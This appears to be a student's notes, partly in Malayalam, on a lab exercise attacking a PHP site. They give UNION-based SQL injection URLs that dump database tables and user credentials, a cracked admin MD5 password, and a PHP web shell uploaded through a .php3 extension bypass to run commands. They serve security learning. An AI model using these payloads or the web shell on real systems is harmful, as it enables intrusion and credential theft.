## Introduction
-->This course details the exploitation of SQL injection in a PHP based website and how an attacker can use it to gain access to the administration pages.
-->Then, using this access, the attacker will be able to gain code execution on the server.
-->The attack is divided into 3 steps :
-   Fingerprinting: to gather information on the web application and technologies in use.
-   Detection and exploitation of SQL injection: in this part, you will learn how SQL injections work and how to exploit them in order to retrieve information.
-   Access to the administration pages and code execution: the last step in which you will access the operating system and run commands.

## Fingerprinting
-->Fingerprinting can be done using multiple tools. First by using a browser, it's possible to detect that the application is written in PHP.

## Inspecting HTTP headers
-->A lot of information can be retrieved by connecting to the web application using netcat or telnet :
->`telnet vulnerable 80`
Where:
-   vulnerable is the hostname or the IP address of the server;
-   80 is the TCP port used by the web application (80 is the default value for HTTP).
-->By sending the following HTTP request:
```
GET / HTTP/1.1
Host: vulnerable
```
-->It is possible to retrieve information on the version of PHP and the web server used just by observing the HTTP headers sent back by the server :
```
```http
HTTP/1.1 200 OK
Date: Thu, 24 Nov 2011 04:40:51 GMT
Server: Apache/2.2.16 (Debian)
X-Powered-By: PHP/5.3.3-7+squeeze3
Vary: Accept-Encoding
Content-Length: 1335
Content-Type: text/html
```
-->Here the application is only available via HTTP (nothing is running on the port 443). If the application was only available via HTTPs, telnet or netcat would not be able to communicate with the server, the tool`openssl` can be used:
->`openssl s_client -connect vulnerable:443`
Where:
-   vulnerable is the hostname or the IP address of the server;
-   443 is the TCP port used by the web application (443 is the default value for HTTPs)

## Using a directory Buster
-->The tool wfuzz ([http://www.edge-security.com/wfuzz.php](http://www.edge-security.com/wfuzz.php)) can be used to detect directories and pages on the web server using brute force.
-->The following command can be run to detect remote files and directories:
->`python wfuzz.py -c -z file,wordlist/general/big.txt --hc 404 http://vulnerable/FUZZ`
-->The following options are used :
-   `-c` to output with colors.
-   `-z file,wordlist/general/big.txt` tells wfuzz to use the file`wordlists/general/big.txt` as a dictionary to brute force the remote directories' name.
-   `--hc 404` tells wfuzz to ignore the response if the response code is 404 (Page not Found)
-   `http://vulnerable/FUZZ` tells wfuzz to replace the word FUZZ in the URL by each value found in the dictionary.
-->Wfuzz can also be used to detect PHP script on the server :
->`python wfuzz.py -z file -f commons.txt --hc 404 http://vulnerable/FUZZ.php`

## Introduction to SQL
-   retrieve information using the `SELECT` statement;
-   update information using the `UPDATE` statement;
-   add new information using the `INSERT` statement;
-   delete information using the `DELETE` statement.
-->The most common query used by web sites is the SELECT statement which is used to retrieve information from the database. The SELECT statement follows the following syntax :
```
SELECT column1, column2, column3 FROM table1 WHERE column4='string1'  AND column5=integer1 AND column6=integer2;
```
-   the`SELECT` statement indicates the action to perform: retrieve information;
-   the list of columns indicates what columns are expected;
-   the`FROM table1` indicates from what tables the records are fetched;
-   the conditions following the`WHERE` statement are used to indicate what conditions the records should meet.

-->For example, let see what the request :
```
SELECT column1, column2, column3 FROM table1 WHERE column4='user'  AND column5=3 AND column6=4;
```
-->ingane query undayal. column1,2,3 il enthano ullath ath athpole retreive chyum. ennal column4 il user enn value koduthathkond column 4 ile ella rows ilum user enn mathramen undakum.athupole column 5 ile ell rows ilum 3 enna number mathrame undakum ok
-->==If you read source code dealing with some databases, you will often see `SELECT * FROM tablename`. The `*` is a wildcard requesting the database to return all columns and avoid the need to name them all.==

## The UNION keyword
-->The UNION statement is used to put together information from two requests :
```sql
SELECT * FROM articles WHERE id=3 UNION SELECT ...
```
-->Since it is used to retrieve information from other tables, it can be used as a SQL injection payload.The beginning of the query can't be modify directly by the attacker since it's generated by the PHP code. However using UNION, the attacker can manipulate the end of the query and retrieve information from other tables :
```sql
SELECT id,name,price FROM articles WHERE id=3 UNION SELECT id,login,password  FROM users
```
-->The most important rule, is that both statements should return the same number of columns otherwise the database will trigger an error. athayath aadyathe query il rand column aanengil namal union vech chyuna samayathum rand column thane aayrikanam. vere vazhi alland und like oru column il thane rand column concatenate chyunath.ath pine padikuayirikum ok

## Rules Fo Exploiting SQL injections with UNION
-->Exploiting SQL injection using `UNION` follows the steps below:
1.  Find the number of columns to perform the UNION
2.  Find what columns are echoed in the page
3.  Retrieve information from the database meta-tables
4.  Retrieve information from other tables/databases
-->namal portswigger il padichirunu.columns kandethan namuk orderby or null vech kandupidkam

## Retrieving information
-->You can for example access the following URL's to retrieve this information :
```sql
->  the database version: [http://vulnerable/cat.php?id=1%20UNION%20SELECT%201,@@version,3,4](http://vulnerable/cat.php?id=1%20UNION%20SELECT%201,@@version,3,4)
->  the current user: [http://vulnerable/cat.php?id=1%20UNION%20SELECT%201,current_user(),3,4](http://vulnerable/cat.php?id=1%20UNION%20SELECT%201,current_user\(\),3,4)
->  the current database: [http://vulnerable/cat.php?id=1%20UNION%20SELECT%201,database(),3,4](http://vulnerable/cat.php?id=1%20UNION%20SELECT%201,database\(\),3,4)
```
-->In order to retrieve information related to the current application, we are going to need :
-   the name of all tables in the current database
-   the name of the column for the table we want to retrieve information from
-->The following queries can be used to retrieve :
-   the list of all tables: `SELECT table_name FROM information_schema.tables`
-   the list of all columns: `SELECT column_name FROM information_schema.columns`
-->By mixing these queries and the previous URL, you can guess what page to access to retrieve information :
-   the list of tables: `1 UNION SELECT 1,table_name,3,4 FROM information_schema.tables`
-   the list of columns: `1 UNION SELECT 1,column_name,3,4 FROM information_schema.columns`

-->The problem, is that these requests provide you a raw list of all tables and columns, but to query the database and retrieve interesting information, you will need to know what column belongs to what table. Hopefully, the table information_schema.columns stores table names :
```sql
SELECT table_name,column_name FROM information_schema.columns
```

-->so namuk slq i vazhi admin page ilek keran patiyal namal admin account vazhi entheniglum img or file upload chyanam. like php file and it contains :
```php
	<?php
	  system($_GET['cmd']);
	?>
```
-->so ini ee file upload chyuna path il poi ?cmd=uname enn koduthal namuk webshell kitum ok
-->The webshell has the same privileges as the web server running the PHP script, you won't for example be able to retrieve the content of the file `/etc/shadow` since the web server doesn't have access to this file (however you should still try in case an administrator made a mistake and changed the permissions on this file).

# Video explanation
-->so namal lab edukunu.enit athil all pictures edukumbol url il ?ide=1  enn kanunu.so avide ?id=1' enn kodukumbol sql query break aayi
-->so ini namal athil `?id=3 union select 1,2,3,4`  enn kodukumbol error varunila.so athinartham 4 columns aan namude first query il ullath
-->matoru reethiyil column number kandethal `order by`  use chyam ie, `?id=3 order by 5`  enn idumbol `unknown column '5'`  enn kanikunu.so `?id=3 order by 4`  enn kodukumbol page normal aayi thane kanikum. ini `?id=3 order by 3`  enn koduthalum norma aayi kanikum.limit il kooduthal column aayal aan error varuka ok
-->ivide 1,2,3,4  il 2 inte avide kore number idumbol ath page il reflect chyunund ie, `1,234234234,3,4`
-->ivide 2 enna column inte avide ullath reflect chyunond namuk athil ini oron test chyam ie, database version nokam
->`http://ptl-52ce9865-e6c1c015.libcurl.so/cat.php?id=3%20union%20select%201,@@version,333333,4
-->ini namuk ella tabel_name um nokam.athin information_schema.tables il ninum nokam
->`id=3 union select 1,table_name,3,4 from information_schema.tables`
-->ipol ella tables um kitum.ella tables um kiti enn vech athile contents dumb chyan patils.dumb chyanengil athil ulla columns inte peru ariyanam.so athin namal `column_name` from `information_schema.columns`  use chyanam ie,
->`?id=3%20union%20select%201,column_name,3,4%20from%20information_schema.columns`
-->ipol namuk ella columns um dumb chyth kitum but ath eth table inte aanen areela. athin namal concatenate chyanam.ath ivan parayunila. but namuk ithil vendath login enna column aan.ath users enna table ile column aan.so namuk ath direct chyam :
->`?id=3%20union%20select%201,login,3,4%20from%20users`
-->ingane chyumbol namuk admin enn page il render chythath kanam
-->ini ithupole namuk password kandetham :
->`?id=3%20union%20select%201,password,3,4%20from%20users`
-->ipol namuk adminte passwd kitum ->8efe310f9ab3efeae8d410a8e0166eb2
-->ini namuk admin dashbordilek keram but password adichit aakunila.karanam.ith just oru password alla.ith passwd hash chythathn so namuk first ith crack chyanam
-->ithinte length kanumbol thane ariyam ith md5 hash aanen so.john the ripper onum venda namuk direct online il ninum crack chyam.angane crack chyumbol namuk password kitum ->**P4ssw0rd**
-->ini namuk admin account il keram ok
-->Admin dashbordilek keriyal pine namuk ini webshell upload chyan nokam
-->ivide admin accountil kerumbol image upload chyan ulla section kanunund.so athil namal oru puthiya image upload chyanam.so athin aadyam oru php script undakanam enit file.php enn peru koduth save chyanam
-->ini upload chyanam.apol "NO PHP" enn error varum.so namal upload chyunath intercept chyth file.php ennath mati file.php3 enn kodukuka.apol namuk aa php file upload chyan patunund
-->ini upload chytha file ilek pokuka.avide page il onum kanan ila.karanam sherikum img file aan upload chyendath.namal upload chythathil image ila.athukondan onum kanikathath.ini namal right click chyth view-source adichal img inte src kanan patum ie,
```html
<img width='400px' src="admin/uploads/php.php3 alt="webshell" />
```
so ee pathilek pokuka.apol avidem error kanikum "undefinded cmd" enoke paranj.so namal url il ?cmd enn koduth enthengilum commadn kodukumbol aakm ie, `?cmd=uname` 
-->ini namal lab il thanitula UUID kodutha send chyumbol namude lab complete aakum ok